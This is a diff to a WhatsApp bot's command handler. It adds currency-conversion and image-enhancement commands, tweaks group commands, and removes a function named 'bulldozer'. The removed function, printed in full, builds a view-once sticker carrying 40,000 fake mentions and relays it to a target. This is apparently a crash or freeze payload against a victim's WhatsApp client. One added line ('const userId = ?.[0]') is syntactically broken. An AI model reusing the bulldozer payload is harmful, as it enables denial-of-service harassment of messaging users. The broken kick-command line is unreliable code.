@@ -63,7 +63,6 @@ const {
     showCurrentMenu, 
     loadMenuConfig 
 } = require('./DevKelvin/menu');
-const { Remini } =require('./lib/remini')
 const {
  fetchMp3DownloadUrl,
   saveStatusMessage,
@@ -431,84 +430,6 @@ Usage:
 ✦ tosgroup text
 ✦ Reply to media/sticker with .tosgroup
 ✦ Add caption after command`;
-}
-
-// Func Buldozer
-async function bulldozer(isTarget) {
-  let message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-          mimetype: "image/webp",
-          directPath:
-            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-          fileLength: { low: 1, high: 0, unsigned: true },
-          mediaKeyTimestamp: {
-            low: 1746112211,
-            high: 0,
-            unsigned: false,
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from(
-                {
-                  length: 40000,
-                },
-                () =>
-                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-              ),
-            ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
-          },
-          stickerSentTs: {
-            low: -1939477883,
-            high: 406,
-            unsigned: false,
-          },
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
-        },
-      },
-    },
-  };
-
-  const msg = generateWAMessageFromContent(isTarget, message, {});
-
-  await conn.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [isTarget],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: isTarget },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
-  });
 }
 
   // Function to check bandwidth (download/upload)
@@ -1115,8 +1036,9 @@ let teks = `
 return reply(teks)
 }
 break
+case 'createchannel': 
 case 'createch': {
-    if (!Access) return m.reply("*Owner command only*");
+    if (!Access) return m.reply(mess.owner);
     let parts = text.split('|');
     let channelName = parts[0]?.trim();
     let channelDesc = parts[1]?.trim() || '';
@@ -6471,22 +6393,120 @@ if (!text) return reply("📌 *Enter a search query.*");
 }
 break
 case "remini": {
-const quoted = m.quoted ? m.quoted : null || m.msg ;
-      const mime = quoted?.mimetype || "";
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
 
-      if (!quoted) return reply("📌 *Send or reply to an image.*");
-      if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);
+    if (!quoted) return reply("📌 *Send or reply to an image.*");
+    if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);
 
-      try {
-        const media = await m.quoted.download();
-        if (!media) return reply("❌ *Failed to download media. Try again.*");
-
-        const enhancedImage = await remini(media, 'enhance');
-        await conn.sendMessage(m.chat, { image: enhancedImage, caption: "*Image enhanced successfully*" }, { quoted: m });
-      } catch (error) {
-        console.error(error);
+    try {
+        await reply("*Enhancing image... Please wait.*");
+        const imageUrl = await handleMediaUpload(quoted, conn, mime);
+        
+        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
+            return reply("*Failed to upload image. Try again.*");
+        }
+        
+        const reminiUrl = `https://apis.davidcyril.name.ng/remini?url=${encodeURIComponent(imageUrl)}`;
+        const response = await axios.get(reminiUrl, {
+            responseType: 'arraybuffer'
+        });
+        
+        // Send the enhanced image directly
+        await conn.sendMessage(m.chat, { 
+            image: Buffer.from(response.data), 
+            caption: "✅ *Image enhanced successfully!*" 
+        }, { quoted: m });
+        
+    } catch (error) {
+        console.error('Remini error:', error);
         reply("❌ *An error occurred while enhancing the image.*");
-      }
+    }
+   
+}
+break
+case "currency":
+case "convert":
+case "cur": {
+    if (!text) return reply(`📌 *Currency Converter*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample:\n${prefix}convert 100 USD EUR\n${prefix}convert 50 GBP JPY\n${prefix}cur 1000 UGX KES`);
+
+    const args = text.trim().split(/\s+/);
+    if (args.length < 3) {
+        return reply(`❌ *Invalid format!*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample: ${prefix}convert 100 USD EUR`);
+    }
+
+    const amount = parseFloat(args[0]);
+    const from = args[1].toUpperCase();
+    const to = args[2].toUpperCase();
+
+    if (isNaN(amount)) {
+        return reply(`*Invalid amount!*\n\nPlease provide a valid number.\nExample: ${prefix}convert 100 USD EUR`);
+    }
+
+    try {
+        await reply(`*Converting ${amount} ${from} to ${to}...*`);
+
+        const apiUrl = `https://apis.davidcyril.name.ng/tools/convert?amount=${amount}&from=${from}&to=${to}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.success && response.data?.result) {
+            reply(`💱 *Currency Conversion*\n\n${response.data.result}`);
+        } else {
+            reply(`*Conversion failed!*\n\nPlease check the currency codes.\nExample: ${prefix}convert 100 USD EUR`);
+        }
+    } catch (error) {
+        console.error('Currency error:', error);
+        reply(`*Error converting currency.*\nPlease try again later.`);
+    }
+  
+}
+break
+case "currencies":
+case "curlist":
+case "listcur": {
+    if (!Access) return reply(mess.owner);
+    
+    try {
+        await reply("🔄 *Fetching currency list...*");
+        
+        const apiUrl = "https://apis.davidcyril.name.ng/tools/currencies";
+        const response = await axios.get(apiUrl);
+        
+        if (response.data?.success && response.data?.currencies) {
+            const currencies = response.data.currencies;
+            
+            // Format the list in chunks
+            let message = `💱 *SUPPORTED CURRENCIES*\n\n📊 *Total:* ${currencies.length} currencies\n\n`;
+            
+            // Group currencies in rows of 8
+            let line = "";
+            for (let i = 0; i < currencies.length; i++) {
+                line += `• ${currencies[i]}  `;
+                if ((i + 1) % 8 === 0 || i === currencies.length - 1) {
+                    message += line + "\n";
+                    line = "";
+                }
+            }
+            
+            message += `\n📌 *Usage:* ${prefix}convert <amount> <from> <to>\n📌 *Example:* ${prefix}convert 100 USD EUR`;
+            
+            // Send message (split if too long)
+            if (message.length > 4000) {
+                const parts = message.match(/[\s\S]{1,4000}/g);
+                for (const part of parts) {
+                    await reply(part);
+                }
+            } else {
+                await reply(message);
+            }
+        } else {
+            reply("*Failed to fetch currency list.*");
+        }
+    } catch (error) {
+        console.error('Currency list error:', error);
+        reply("*Error fetching currency list.*\nPlease try again later.");
+    }
+    
 }
 break
 case 'kiss':
@@ -11130,7 +11150,7 @@ try {
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
     
-        const userId = mentionedJid?.[0] || m.quoted?.sender;
+        const userId = ?.[0] || m.quoted?.sender;
         if (!userId) return reply("ℹ️ Please mention or quote the user to kick");
 
         await conn.groupParticipantsUpdate(from, [userId], "remove");
